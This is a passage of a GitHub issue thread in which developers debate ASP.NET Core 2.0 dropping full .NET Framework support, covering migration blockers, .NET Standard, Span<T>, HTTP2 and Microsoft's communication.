We recently stood up a couple new web apps using ASP.Net Core 1.1, necessarily targeting the full 4.6.2 framework. These apps use large swaths of our existing shared libraries. We've burned an embarrassing amount of dev time dealing with project.json, then the new .csproj, trying to mix old and new .csproj's in the same solution, dropping back to VS15 to get things done with old .csproj types, broken System. dependencies, and a litany of assembly binding problems, build & publishing issues.. the list goes on and on.

And now we've been left hanging high and dry in a dead end. Do we throw away a few man-months of development or spend many times that trying to first just ascertain what might and might not work and then figuring out any way to upgrade, and then if that's even possible doing it.

I can't say I disagree with the direction and necessity of it, but earlier communication would've been appreciated."
745	"Oh, and of course, the Azure Service Fabric libraries don't run on .NET core either - which is another blocker for us. 

I'd say you should support the full .NET framework until you can deliver a proper .NET core story within Microsoft (and especially Azure)."
746	@cwe1ss This change will reduce some of the complexity of the  .NET ecosystem though. Since you will not have two different formats (ASP.NET Core + .NET Full and ASP.NET + .NET Core). I totally agree about the outdated information but I think that can't be avoided when you develop in the open like Microsoft does now.
747	"@davidfowl 
>The code sharing story across different .NET runtimes is .NET Standard. Your libraries should try to target that to code shared across .NET Core and .NET Framework.<

But the full framework as I understand it doesn't even support.net standard so it's really not a useful standard.

>>Microsoft seems to have forgotten the importance of backward compatibility.<<

>The problem is, ASP.NET Core was never meant to be backwards compatible... That why there was such a big paradigm shift from ASP.NET 4.x. Seems like if backwards compatibility is the high order bit for you'd be better of using ASP.NET 4.x on .NET Framework. That is supported for the forseeable future and will be security patched for as long as Windows is alive.<

Security patching is only part of the issue. The web standards change so quickly that we need to have something that we can use the latest standards with. So for example I saw somewhere above something about HTTPS v2. I have no idea what that means in practice but the point being is that I want my framework to be able to support these things. If I am forced stay with an older version of the framework whether it is v4 or v1 it's not going to support the things that are required.

ASP .net Core was always marketed as running on both .net core and on the framework. As others have said, it doesn't bother me if we have to wait six months or a year until the framework catches up. I'm normally about six months or more behind anyway.  But what seems to be happening is that our existing investment is being completely abandoned, like so many other Microsoft technologies that many of us have invested time in.

Stefan"
748	"@Rutix for ""developing in the open"" this major breaking change was done suprisingly silent without any announcement nor survey (after all, this issue was created by a community member watching pull requests).

Doing things silently has bitten microsoft in the past and they don't seem to learn. And don't even try to tell me that they couldn't see that dropping full framework support would perturb the community and hurts the faith and investment in the platform.

Last incident was https://github.com/dotnet/roslyn/issues/17054 but they quickly corrected it, i'm wondering how this will go over."
749	">But the full framework as I understand it doesn't even support.net standard so it's really not a useful standard.

@stefanolson That is not correct. Libraries targeting .Net Standard 1.x can run on various full framework versions today. Libraries targeting .Net Standard 2.0 are slated to be able to run on 4.6.1 last I looked."
750	@Suchiman I am totally agreeing with you there. I am a bit disappointed that they don't seem to learn how to communicate and stuff dropping bombs on the community. They could have handled this way better if they announced it first and had a community discussion. 
751	"> But the full framework as I understand it doesn't even support.net standard so it's really not a useful standard.

@stefanolson It does. Different (existing) versions of .NET Framework implement different versions of the .NET standard. See https://blogs.msdn.microsoft.com/dotnet/2016/09/26/introducing-net-standard/"
752	"I know I'm a bit late to this thread but here are two of our use cases for using ASP.NET Core on NetFX on Windows:

### Using ASP.NET to host a REST API for your application
Our application is a "".NET API-turned into-REST API"" kind of application. It first shipped as a .NET API, and has dependencies into all kinds of Windows stuff.

When we added a REST API, we choose ASP.NET Web API to host it. When it became clear the Web API was unifying in ASP.NET vNext/5/Core, __and__ we figured out that __ASP.NET Core would run on NetFX__ it made sense to use ASP.NET vNext/5/Core. 

While we take advantage of .NET Core to port (part of) our application to Linux and macOS, there still are Windows-dependencies that don't run on .NET Core (to get a list of dependencies that we did port, check the `CoreCompat.*` NuGet packages). 

So long story short, we now find ourselves locked on ASP.NET Core 1.x which will remain support for about a limited period of time. And then what? Back to ASP.NET 4?

I understand all the perf work you're doing and pushing boundaries in other areas of .NET Core, but in my use case, I'm not hosting a high-volume internet-exposed website, I'm hosting a REST API which will get like what, 10-20 RPS max?

### Visual Studio support

Really, my Visual Studio 2017 experience on NET 4.x is still much better than .NET Core - a good example there is the amount of time it takes to re-compile a test project and have the new tests show up in the test window. It's a lot faster on NetFX.

We end up with a situation where today we have a NetFX and .NET Core project side-by-side compiling essentially the same codebase. The only reason we keep up with this dual maintenance is because of Visual Studio's performance with .NET Core projects (_especially_ unit tests and the debugger).

As an afterthought, what really strikes me is that this change is made now, a couple of days before the preview release. It just seems to indicate that there is no technical reason to do it yet - so why not make the change in ASP.NET Core v3?"
753	"@mattnischan 
>@stefanolson That is not correct. Libraries targeting .Net Standard 1.x can run on various full framework versions today. Libraries targeting .Net Standard 2.0 are slated to be able to run on 4.6.1 last I looked.<

It appears to me as though asp.net core is going to run .net core not .net standard? So I'm still not sure of what the point of the .net standard is - if it gets abandoned virtually as soon as it gets created.

It would totally make sense if asp.net core required .net standard 2.1 because there are things that they need that are not in the framework at the moment.  So we had to wait till the full .net framework supported those additional functionalities before we could use the latest version of Asp.net core.  That would work and make sense.

But instead they are just abandoning the standard making the standard useless (if I'm understanding this confusing situation correctly)"
754	"So... its Build 2017 starting tomorrow; I imagine the team are very busy preparing for it. Maybe some announcements, maybe not. Perhaps, give them a bit of breathing room and reconvene in a week? 

Maybe catch the show https://build.microsoft.com/ (Wed 8:00 PST, 15:00 GMT and Thurs similar?)

We may know more; may not. Things may be clearer, may not. However, the ASP.NET team will likely be able to respond a bit better and focus on everyone's concerns more. Though @davidfowl has been doing valiantly!"
755	">@stefanolson But instead they are just abandoning the standard making the standard useless (if I'm understanding this confusing situation correctly)

I think the point of .NET Standard is compatibility. Library authors can target .NET Standard and then anyone can use it, whether they're on .NET Framework, .NET Core, or something else that supports .NET Standard.

I think the point of .NET Core is a re-imagining of .NET Framework. .NET Core is cross-platform, high performance, open source, and rapidly evolving. 

Changing the implementation of string to utf8 by default is massive and not something you would ever expect to see on .NET Framework.

After reading this thread, I feel: 
.NET Core -> .NET Framework is like ASP.NET MVC -> WebForms."
756	"I'd like to second the tooling aspect as well. The current restore/build/test etc. performance is *very* bad and a royal pain. If we had to ""stay on 1.0"" would we still be able to use newer SDKs with (hopefully) better perf or would we be stuck with a 1.x SDK?"
757	"The .NET Core story is a wonderful tour full of ups and downs. We just recently started working on ASP.NET Core because of all the previous ""fuck ups"" (versioning, naming, project.json - .csproj transition) and I was (and I am) looking forward to .netstandard 2.0, because I think this will be the first ""real"" release.

I get it that ASP.NET Core 1.1 is still supported and will run the next 10 years, but you guys are super brave to move __that__ fast and cutting one of the earlier selling points of ASP.NET Core.

If you want to know what is a blocker (besides directory services) from our side: We are still using EF6 and still wait for an official Open XML SDK NuGet package that targets netstandardwhatever.
Migrating code might take a very long time...

"
758	"Would it be possible to formalize some sort of process for pushing forwards `netstandardXX` based on changes that happen in Core which involves targeting it as part of a maintenance phase of Asp.Net Core  library release?

As it stands, I have a WebForms/MVC app that we were about to pull a trigger on exposing a ANC web api to and call from a SPA (and ultimately from the WebForms legacy app), but we cannot dev on the CoreCLR because of a dependency on **Sybase (now SAP) Ase ADO.NET** driver (if someone reading this could push on a button somewhere at SAP ... I sadly cannot seem to get heard at all on this or on bugs that I have known about for over 9 years now).

Reading this issue, I'm not so sure anymore what my path should be. The only thing I am confident I can plan on is a buggy driver will continue to exist for the desktop framework. Was I supposed to ignore the changes to ASP.NET over the past several years because they were going to be a waste of my time and I should just target WebApi2? Am I supposed to say go ahead with ANC 1.x under the knowledge that I'll likely never migrate and see benefits of 2.x in an application I believe will be supported here for the next 10-15 years (the WebForms app has been migrated and maintained since the 1.1 framework was released)?"
759	"@davidfowl

> Span itself has a portable version that runs anywhere, I'm not sure the fast implementation will ever be 
> on .NET Framework. The APIs that will be added to .NET Framework that take advantage of Span may take a lot longer than Span itself, it's extensive. When's the last time we changed string and array in .NET 
> Framework?

Wait, what?

Not all of us are web developers. We've been eagerly awaiting better string handling support for years and now all of a sudden you are telling us that we're SOL? That the .NET Framework and the countless non-web applications built on it will never get access to string handling libraries based on Span?

This is no longer just a ASP.NET issue. It goes to the heart of Microsoft's long-term commitment to .NET Framework and its base class library."
760	"You know, I really have to give it to people like @davidfowl for continuing to respond to everyone and to everyone for contributing to this discussion. I have a lot to catch up on from earlier today, but I feel as if I'm learning a lot through each comment in terms of what everyone is using/hoping to use .NET for. 

I think we'll eventually get some path(s) straightened out with everyone's help and I hope that all sides are taken into consideration.

I'm eagerly awaiting the official announcement "
761	"If I understood it right, net**coreapp**2.0 will provide a compatibility shim that will allow our ASP.NET Core 2.0 projects to depend on our legacy NetFx class libraries (e.g., net461).
Where can I find more information about the currently planned capabilities/limitations of such compat shim?"
762	"@dgaspar That's not really accurate, here's how it works: `netcoreapp2.0` supports *most* of the APIs in `net461`. If your library is built for `net461` and only calls the APIs that exist within the subset that `netcoreapp2.0` supports, then you can import the library anyway (think of it as overriding, that you know better) and make it run, since all the classes and methods it calls should be there.

Now there's also a downside: if the methods *aren't* there or aren't fully supported in some way, you get runtime errors for missing methods, etc. So compile-time checks aren't a good assurance there. It's a bit of a double-edge sword to be aware of, but there for some libraries that will never be updated yet are just fine with the set of APIs they call."
763	"even node.js allow us to easily call all netfx libraries. 

the mvc code is really the easy part. it may take a few weeks to rewrite in node.js or nancy, but it will take much longer to port business and algorithm code, and prove it works as solid as the old one. not to mention the case when we do not have the source.

take the RyuJit example, even after release to production, blocking major bugs were found and it took another year to fully resolve. same for our software, which are not pet shops but industrial tools which help making million dollars a day. 

the UI framework changes fast, from winform to web. but core business logic/algorithm are much more stable and long lived. so, to use the new shiny UI framework, we need to rewrite/retest or abandon our business/algorithm code? no, we known the new shiny one will be replaced by something more trendy in 5 years, but our business/algorithm code will continue being used."
764	"@qmfrederik 

> As an afterthought, what really strikes me is that this change is made now, a couple of days before the preview release. It just seems to indicate that there is no technical reason to do it yet - so why not make the change in ASP.NET Core v3?

We're doing HTTP2 support next and it requires new APIs."
765	"> I'd like to second the tooling aspect as well. The current restore/build/test etc. performance is very bad and a royal pain. If we had to ""stay on 1.0"" would we still be able to use newer SDKs with (hopefully) better perf or would we be stuck with a 1.x SDK?

Yep, that will work."
766	"@davidfowl 
>We're doing HTTP2 support next and it requires new APIs.<

So the kind of HTTP2 support that will be available in asp.net core 2.0 won't be available in 1.x? This is really the kind of problem that I worry about where we won't have access to the latest technology because we are bound to the full .net framework for whatever reason. As I've said above doesn't matter if it takes six months to a year for that filter through to whatever I'm using but ultimately don't want to be too far behind. Due to codesharing and third-party library usage at this stage I need the full .net framework."
767	"at last, i clarify a few things:
* when i say legacy modules, they are dlls depending on netfx or c++/cli dlls, which in turn may pinvoke some native dlls. they are for business/algorithm, no COM, no asp.net. they are not bad. they become legacy mainly because .net core does not run them.
* it is possible to migrate to net core in the long run, and we really want it. but it is really hard to push that to happen.it will take a few years for us and 3rd parties to be all there.
* the domain specific libraries is much slower than mainstream libraries for tech stack changes. we all know the python 3 example. those domain specific libraries are real business."
768	"@danielcrabtree
>I think the point of .NET Core is a re-imagining of .NET Framework. .NET Core is cross-platform, high performance, open source, and rapidly evolving.<

Which is fantastic. The challenge is how deal with the existing code bases and how do we get those usable with .net core. If WPF was available built on .net core then I could use .net core everywhere. But as it isn't and my code is shared between WPF and ASP.net I need a way to share them. But I don't want to be too far behind with the latest web technology and security techniques most (all?) of which sounds like will only be in  2.x and later"
769	"A few times in this thread and in documentation elsewhere .NET Core is described as cross-platform. This was advertised as one of the major selling points for moving to the platform.

This **does not seem to be the case** however as clarified in this conversation on Twitter

https://twitter.com/James_M_South/status/861595907782987776

And the comment above; emphasis mine.

>The remaining large gaps missing in .NET Core 2 are System.DirectoryServices and System.Drawing. We are working to have a **Windows compat pack** which would enable both of those on **.NET Core on Windows** this summer.

I've been working very hard with .NET Core since very early on trying to fill the gap left behind by `System.Drawing` with [ImageSharp](https://github.com/JimBobSquarePants/ImageSharp) and I am now left both very confused and more than a little disgruntled and asking:

What even is .NET Core now? 

Here's the description from the [MS Docs](https://docs.microsoft.com/en-us/dotnet/articles/core/).

>.NET Core is a general purpose development platform maintained by Microsoft and the .NET community on GitHub. It is cross-platform, supporting Windows, macOS and Linux, and can be used in device, cloud, and embedded/IoT scenarios.

There's that **cross-platform** statement again. Is it or isn't it? I think trying to pin this down leads to much confusion across the development community.

Every description I read seems to be different. 

Can we:

1. Please get a decent, consistent, message written down somewhere so that we can actually have a target to aim for and a better overall understanding.
2. Get some clarity delivered on the actual roadmap for `System.DirectoryServices`, and `System.Drawing`

`System.Drawing` in particular is both confusing and concerning. I cannot fathom why you would ever want to port that API to .NET Core on any platform. It's difficult to work with, unsupported on the server, and lacks many critical features required for modern development (Multi threading, Pixel Formats, ICC, EXIF, Quantization, Indexed Png and so on). 

"
770	"There are a lot of recognizable names and faces here, and I know I'm just adding some noise here, but:

- DirectoryServices
- Drawing (not that I need it)
- EF

These seem like the three most critical things to have up to speed before making such a large break. Personally, most everything I work on is on net4x solely because of EF6, since EFCore... well... :trollface: "
771	"@stefanolson 
I think you're expected to separate out the shared code into a .NET Standard library. Then it will be usable from WPF and ASP.NET on .NET Framework and from ASP.NET on .NET Core and other .NET Core applications.

@JimBobSquarePants
I don't think Windows compat pack is part of .NET Core. It's a Windows specific library that sits on top of .NET Core. You could imagine there being a Linux specific library that exposed Linux-only features. 

I think the Windows compat pack is about making it simpler to migrate existing .NET Framework code bases. Obviously, once someone has switched to .NET Core, they should then look at migrating to better solutions like ImageSharp.

@stefanolson 
It's possible they could even create a Windows-only WPF pack that let you create WPF applications in .NET Core, but which would only run on Windows."
772	"This GitHub issue has been mentioned on a German IT news site:
https://www.golem.de/news/asp-net-core-2-0-microsoft-veraergert-net-entwickler-mit-support-entscheidung-1705-127712.html"
773	Thanks @danielcrabtree that's the first I've heard of any compatibility packs. 
774	Translation for @MJomaa's link: https://translate.google.com/translate?u=https%3A%2F%2Fwww.golem.de%2Fnews%2Fasp-net-core-2-0-microsoft-veraergert-net-entwickler-mit-support-entscheidung-1705-127712.htm
775	I'm waiting on System.Xaml to be ported over.
776	@alexwiese don't hold your breath.
777	"> I'm waiting on System.Xaml to be ported over.

Go on; I'll bite. How are you using Xaml on your website?"
778	">Go on; I'll bite. How are you using Xmal on your website?

Cross platform UI (screen templates shared between a ""green screen"" console application, Xamarin app, and an Angular SPA), also used for a business rules engine."
779	"Wow, ok so you are transforming the XAML's XML in some way to HTML and Javascript? Fair enough 😄

Wasn't sure if you were just trolling. "
780	I'm doing the same, but realistically I don't see them porting XAML over, considering that at this point it cannot be parsed without also being executed.
781	"> Wow, ok so you are transforming the XAML's XML in some way to HTML and Javascript? Fair enough 😄

Of course not; I'm converting to JSON first 😉 "
782	Another news article about this topic with many of us being quoted: https://www.infoq.com/news/2017/05/ASPNET-Core-2
783	@cwe1ss The author is @Grauenwolf
784	@alexwiese @yaakov-h I'd love to read a blog post about that; sounds pretty interesting and must come with a different set of challenges than I'm used to.
785	"This is really bad.  ASP.NET Core was a reasonable sell when you could leverage legacy libraries when needed.  In the case where it can be done with the new stuff, tweak a few things and target .NET Core.  Otherwise, just target the full framework.

With this change, it's an all or nothing jump.  And given that you don't always understand all the dependencies up front, it magnifies the risk.

I understand the desire to move fast, and evolve where things are bound to go anyway, but you're going to leave your users behind.  People tend to migrate, not jump.  A large number just won't move off the current.  And then when they do, they might well move to a different platform entirely.  Seriously, you're underestimating that risk.

This is a move that should eventually be made, but more like late 2019, or 2020 at the earliest.  Even then, you still want a long term model for supporting those who have chosen to mix things.

And no, ASP.NET Core 1.x is just not an answer there.  It's immaturity is fine as a transitional phase with an easy migration path forward, but it's not suitable for living with for the long term.  There's a big difference between the mindset of those who develop a platform like this, and those who use it.  Please reconsider this direction."
786	@davidfowl What about something like edge.js for netcore? It makes the API consumer responsible for platform checks and a strongly typed interface between netfx and netcore is sufficient for most scenarios.
787	"Will this template be removed then?

It's baked into VS2017 at the moment.

![image](https://cloud.githubusercontent.com/assets/3924814/25885488/853d88e6-3550-11e7-86de-2802fb408fd2.png)
"
788	"what a totally unacceptable bulshit, again this proves it is a toy technology not ready for prime time and wide adoption. 

I really appreciate guys you have a nice ride and coding experience, you can shine in your blog entries and twitter (hoorrray!), improve your linkedin profiles and cvs (hooray^2), all release parties ahead of you, girls, drinks and stuff looks promising, but .. who is going to use it? do you target enterprises and want large adoption and solid user base? or some startup  hippies only?!?"
789	"That comment about ""full Span"" potentially never making it into .NET Framework is seriously concerning to me. If full Span is not in .NET Framework then I assume APIs using it can never make it into a future netstandard, which makes it impossible to write cross-platform libraries that use or expose high performance parsing? Which means we're stuck with our unsafe custom implementations permanently effectively...

You mention that if you want you're library to be cross-platform then you should target netstandard, but what is ASP.NET Core if not a library that is widely used? Would you recommend other libraries start dropping support for netstandard and switch to .NET Core? Should the next major version of JSON.NET or whatever drop netstandard? It could certainly do with fast parsing!

Note Java managed to add fast IO with zero copying etc in a backwards compatible way with Netty (https://netty.io/)

Finally I do want to say thank you to the people who are willing to hang around and answer these. We do appreciate the answers..."
790	"@shanselman Moving fast is a noble goal, especially for for teams that put paramount amounts of effort into compatibility and designing things in a compatible fashion, like the ASP.Net Team. I know how much they would like to simplify their problem domain, and I support that, but ...

Moving fast and at the same time ""also away"" from your customers is not a good thing either. You know, your customers (me included) have a serious set of legacy software and time investment into existing apps and libraries. You can't just leave us behind and go to a place where we won't/can't follow.

You should consider your customers who can't go to .Net core and must use Full Framework for at least some more time from now. If you move away from Full Framework, you leave allot of people stranded on older versions and create big split in the .Net world. "
791	"@JimBobSquarePants I second you on the `System.Drawing` part. There are some discussions in the other repos about brining `System.Drawing` back. Based on some of the comments in this thread, I understand there will be a ""compat pack"" on Windows first and then on all OS-es for `System.Drawing`.

I wonder what that will look like, and whether it will be based on Mono's libgdiplus or not (which would remove some of the concerns you have with System.Drawing, but that's another story)"
792	"Okay, the way I see it, there are a couple of issues at stake:

1. This was communicated rather poorly. 
1. People weren't involved in the decision. Note that Microsoft is of course free to choose the direction they like, but not discussing this type of large change with the community is not in the spirit of open-source development.
1. There is no ""grand scheme"" that the community can use to examine these types of decisions. At first, .NET Core was a trimmed, cross-platform version of the full framework. Then, with .NET Standard 2.0, it appeared to many that .NET Core 2 would be like a drop-in replacement of the full framework, within reasonable limits of course (no UWP, WinForms, etc.).
1. .NET Core 2 will miss out on several important pieces of functionality that are in the full framework, like System.DirectoryServices. As far as I can tell, this has been acknowledged, but perhaps the road to getting these features added to .NET Core could be made more explicit.
1. ASP.NET Core 2 will not run on the full framework due to the full framework missing newer features. I'm actually totally okay with this. If adding the missing features to the full framework is excessively hard, then don't. Having ASP.NET Core 2 only run on .NET Core 2 actually makes quite a bit of sense, although mentioning them as being one product was probably not the best way to describe their relation.

What I think people would really like to see is a description of the *vision* of the .NET platform. Which direction will things go in? Will the full framework just receive bugfixes and such but no new features? What is being done to add missing features to .NET Core and when can we expect them? Having this explained would hopefully go a long way in easing the anxiety people are feeling now."
793	@davidfowl I guess it's not just about HTTP 2.0; if it's really about HTTP 2.0, couldn't you have ASP.NET Core 2.0 target NetFX with the exception of HTTP 2.0 support? Perhaps even a pluggable model so that the community could do HTTP 2.0 on NetFX if they really wanted?
794	"@cokkiy @popcatalin81 @xprzemekw If you have nothing constructive to say, please refrain from commenting, these kinds of comments are not helping anyone. 

There are legitimate reasons why make the move described by @davidfowl https://github.com/aspnet/Home/issues/2022#issuecomment-300141134

Reasons why postpone it include (say asp.net core 3.0):
 - EF Core is not yet ready to replace EF 6.0 due to many features missing
 - no production ready `System.Drawing` replacement
 - no `System.DirectoryServices`
 - there was mention of `office xml sdk`, but that seem to be already available on netstandard as of 2017-05-01 https://www.nuget.org/packages/DocumentFormat.OpenXml/
 - other packages outside of MS scope unavailable on .net core (nhibernate, various db providers, ikvm)

Reasons why not do it ever include:
 - People ported apps to asp.net core with legacy dependencies with no intention to move to .net core.
 - Worry about leaving netstandard behind and not caring much about it.
 - Some 3rd party packages are unlikely to be ever ported to .net core (which arguably makes them obsolete, but that might be just my opinion)

Example of constructive comment would be adding your reason why you'd like to see one of these three scenarios or suggesting alternative solution. If you just want to express agreement/disagreement use the ""Reaction"" buttons."
795	"@Kukkimonsuta
 
> People ported apps to asp.net core with legacy dependencies with no intention to move to .net core.

Completely agree. Because Microsoft had announced that ASP.NET Core will work on both .net core and .net frameworks. And now leaving them in AspNet Core 1.x is not fair."
796	"The last summary is quite good. I'd just like to add a thing or two:

1.) It should be possible to write Windows Services with .NET Core (I know that daemons on *NIX platforms work differently). So the ServiceBase would still be needed, and this is high priority together with EF.

2.) It should further still be possible to write standalone services with .NET Core, *and additonally* host them within your existing, full-framework based .NET application (i.e. complimentary service from your Windows Forms / WPF app) to extend them.

The latter really is required for slow migration scenarios, where its not possible to make a hard cut and start greenfield."
797	"> Completely agree. Because Microsoft had announced that ASP.NET Core will work on both .net core and .net frameworks. And now leaving them in AspNet Core 1.x is not fair.

I also like to stress again that the huge change back to .csproj and msbuild was mainly excused with the fact that it would not be possible to reference (ASP).NET Core projects from your existing (full framework) .NET projects.

This change makes the latter impossible (at least for the biggest ASP.NET part). So why was compatibility paramount back then (and caused a lot of pain), but isn't now (and again causes a lot of pain)?"
798	"sorry i have to stress, too. But almost 500 comments, i belive if i am involved as a microsoft guy for this issue i had two options: 
1: mute the issue
2: rethink about my decision"
799	"@gingters The csproj change was primarily for _.net_ core though, in order for xamarin, asp.net, uwp and all the other to share code and also reference other project types like native code.

Also, it enables asp.net core 2 projects to reference full framework projects, again, via the compat shim"
800	"@qmfrederik 
> Perhaps even a pluggable model so that the community could do HTTP 2.0 on NetFX if they really wanted?

They technically could. But it seems they don't want to. To me it feels they just don't want to think about the real needs of enterprises / large businesses, or about backwards-compatibility or the need to cope around with something else than greenfield stuff.

And to be frank, the expectation management in the past completely targeted businessed that want to slowly extend / migrate their stuff to cross-platform, while also being able to slowly extend / migrate their existing apps over. So this move is completely unaligned with the previous expectation management."
801	"@aL3891 
> in order for xamarin, asp.net, uwp and all the other to share code

Yes. Exactly. And that also includes WPF/Windows Forms app to consume .NET Core libraries, which is now impossible when you want to go on to .NET Core 2."
802	"Could someone explain exactly why the hell these libraries can not target `netstandard2.0`?

Until now, I have considered `netcoreapp` as a moniker for a cross platform executable (only used in a csproj executable project), but I **never** considered it as a platform, now, it should be considered as a real platform? Why why why, and how did we come to this absurd option?




"
803	"I see the reasoning and rationale behind targeting `netcoreapp2.0`, but I too think this move is very much premature. The ecosystem is nowhere near ready, quite a few very widely used dependencies (including ones likely wanting to be used in greenfield development) don't target any netstandard and it is unclear whether they ever will. Not to mention the Microsoft Packages and SDKs not targeting netstandard, including stuff for Azure.

Just to throw something out there: would it be feasible to polyfill .NET Core 2.0 with the full framework when running on Windows? There already is P/Invoke, so maybe there could be some sort of NETFX/Invoke, nicely wrapped behind a facade Package to fill the API surface.

In the end, I don't think any one of us _wants_ to use stuff that targets `net461` instead of the `netstandard2.0`, it's just that the dependency either can't (missing API) or won't (abandoned, don't want to etc.) change. And to solve this problem, you need to give package developers time and a very clearly communicated plan when and what change happens, maybe even some guidance on how to target the netstandard."
804	"@xoofx
> Could someone explain exactly why the hell these libraries can not target netstandard2.0?

As far as I understand it (someone correct me if I'm wrong), because the full framework (at least `4.6.1`) is supposed to comply with `netstandard 2.0`, and there are features they need that won't be in the full framework for the foreseeable future"
805	"One thing that I find interesting and that ties into the whole question about ""What is the vision?"" are the frequent mentions of `System.Drawing`.

I find that interesting, because classes (unlike e.g., structs like System.Drawing.Color) System.Drawing hasn't been supported on ASP.net for years, at least since the days of .net Framework 3.5. [From the documentation:](https://msdn.microsoft.com/en-us/library/system.drawing(v=vs.110).aspx)

> Classes within the System.Drawing namespace are not supported for use within a Windows or ASP.NET service. Attempting to use these classes from within one of these application types may produce unexpected problems, such as diminished service performance and run-time exceptions. For a supported alternative, see Windows Imaging Components.

Now, of course, people have been actually using GDI+ anyway because in a lot of cases, it works. And I'm not here to discuss whether it's a good idea to rely on unsupported behavior or not.

But I do wonder what the vision is now for .net Core and ASP.net Core: Is it a re-implementation of the good ideas and the removal of the years old cruft (aka. "".net - The Good Parts"")? In that case, why bring in System.Drawing at all?

Or is it basically a rewrite of the full .net Framework to be multi-platform, basically a better Mono?

I'm not arguing either way, I'd just like to know. I feel that the .net and .net Core teams need to do some soul searching, because I feel that it started as the former and is now the latter.

I don't mind staying on .net Framework on Windows (I'm talking about my own projects here, as I'm not driving architecture for my employer). .net Framework works really well, and is supported until at least 2027 on Windows Server 2016.

Being on .net Framework comes with compromises of course. E.g., HTTP/2 support landed much later than other web stacks had it, and required a full OS upgrade - correct me if I'm wrong, but to my knowledge, there's no way to do HTTP/2 with ASP.net on Windows Server 2012 R2. But those compromises are worth it for the strong guarantee of the status quo being supported for another 10 years.

But in order to consider full Framework for new development, I'd love to see the Roadmap for ASP.net on Full Framework - what's planned for ASP.net MVC 6, Web API 3, SignalR 3 etc. I just don't want it to be basically this generation's Visual Basic 6/Classic ASP(.net).

I feel that it is indeed in the best interest of ASP.net Core to focus on .net Core because there's a lot of good stuff that is enabled by the fast pace, and I feel that for the first time in forever, .net Core is production ready, for new development. Move fast, innovate, basically do what Node.js did so successful (and remember that they had their own Stability/Innovation drama, see io.js).

I'd like to thank everyone from the team commenting here - this is a long thread with many different viewpoints, but a civil discussion. I know it must be frustrating for @davidfowl to keep asking ""So, what are you actually missing in order to port?"" and only getting useful answers way into this thread.

But it's also a really valid fear and frustration for people currently on .net Framework to _feel_ that current ASP.net is basically ""finished"" and that all new development will happen in ASP.net Core, which will only run on a platform that they might not ever be able to move to - basically what happened to the Visual Basic 6 folks when they were told ""move to VB.net, or find yourself stranded a few years from now"".

I feel that it's a lot easier to really double down on making ASP.net Core 2.0 on .net Core an amazing Web Stack once people that won't ever be able to use it are reassured that good parts from it will still find their way into their, Classic ASP.net stack.

Anyway, enough of my rambling. It's an extremely hard problem for the team to solve, and I don't envy you. All I (and a lot of other people here) want is some clarity about where the Ecosystem as a whole is going."
806	"> As far as I understand it (someone correct me if I'm wrong), because the full framework is supposed to comply with netstandard 2.0, and there are features they need that won't be in the full framework for the foreseeable future

Thanks! I would like to know exactly which features? @davidfowl mentioned above HTTP2 to be - one - of the reasons? How can a protocol that could be implemented into a whatever separated `System.Http2` assembly is leading to fork an entire .NET platform? Could someone give more details about the full reasoning?"
807	@gingters but its not impossible, libraries can still target .netstandard and be used both by 46 and core, its just asp.net core _itself_ that this is not the case for.
808	@xoofx https://github.com/aspnet/Home/issues/2022#issuecomment-300141134
809	"Reposting because it's buried and un-linkable:

> so if understand correctly, we will eventually have netstandard replacing net framework.

Not thats not correct. I'm not sure how you drew that conclusion. .NET Standard will always be a subset of each of the runtimes that support it.

I want to throw some crazy stuff out here because it's been mentioned a few times. What I'm about to say has no bearing on what will happen, it's all speculation at this point. Several people asked why we want to target .NET Core instead of .NET Standard.

- We've identified strings as one of the major things we'd like to try tackling in .NET Core, there's tons of ideas but one of them is to have string be utf8 by default (tons of compat problems but follow me here).
- Another thing we'd like to fix is the ability to take cheap slices of arrays/strings, any piece of contiguous memory. We've added `Span<T>` and are looking at `Buffer<T>` to represent this. It might mean that String and Array implement new interfaces that make it possible to take a slice that requires 0 allocation.
- This leads to new methods on String that allow splitting that doesn't allocate an array every time.
- This leads to overloads to Int, UInt etc (TryParse) that take `Span<char>` and `Span<byte>`.
- This leads to new encoding routines that take `Span<byte>`.
- `Buffer<T>` and `Span<T>` let you represent memory in a uniform way and we want to upgrade the networking stack to allow passing pre-pinned buffers that take `Span<T>` or `Buffer<T>`.
- Kestrel will implement HTTP2 in the 2.x timeframe (currently aiming at 2.1) and that requires new APIs on SSL stream to do ALPN (https://en.wikipedia.org/wiki/Application-Layer_Protocol_Negotiation).
- Http Client on .NET Core supports duplex streaming, it'll make it possible to implement streaming end points over http in signalr over a single, non websocket http request.
- We forked the header parser implementations from HttpClient and System.Net.Http and renamed them (https://github.com/aspnet/HttpAbstractions/tree/d1d9bceff56cb44a194ae36923ce687e5e353006/src/Microsoft.Net.Http.Headers) so that we could improve them and have them support both .NET Framework and .NET Core. .NET Core has a copy of these improvements haven't made it back because there no need to improve them (we couldn't consume them).
- There are a bunch new threading primitives that require new API that will light up new scenarios if we're able to consume them (https://github.com/dotnet/corefx/issues?q=is%3Aopen+is%3Aissue+author%3Adavidfowl+label%3Aarea-System.Threading), those are just some of the things I've personally filed. 


Without the ability to rev the core primitives, we're encouraged to fork them and make things that look like them but aren't them. It's the reason we have our own little BCL within ASP.NET Core https://github.com/aspnet/Common/tree/dev/src/Microsoft.Extensions.Primitives.

That was  just a random dump of things I can see us doing in the near term that affects very fundamental pieces of .NET."
810	Hey all, thanks for a very interesting discussion. This thread has reached critical mass and some of the same questions are being asked and re-answered. I'm going to bow out now 👋 .
811	"@aL3891 
>  its just asp.net core itself that this is not the case for

Which - just for example - kills hosting ASP.NET Core 2 as a windows service (as all api's are missing in .NET Core, and TopShelf is just running on the full framework). Which is actually a pretty strong restriction. And also disallows hosting a .NET Core 2 service extension being hosted within your exsiting WPF / Windows Forms app, which is a common scenario in integration use cases with legacy apps."
812	"The fast version of `Span<T>` not going to be available on .NET full is really weird: how is Microsoft going to speed up Roslyn then? They have a fast `Span<T>` and accompanying tech, but won't use it in every Visual Studio installation on the planet, because ... politics? Because there's no manager up in the tree at MS brave enough to say: we have to put more effort in .NET full? 

But don't let me ruin the rainbows and colors marketing blabla talks that will be spread later today from //build. I'm sure MS will paint a rosy picture that everything is *fine* and the rest of the planet is still living in a cave."
813	@davidfowl Thanks for your efforts here, your insights and answers have surely helped many people. 👏 
814	@gingters Its absolutely limting the set of scenarios, but i'm just saying that the whole netstandard/csproj effort is not wasted because of it
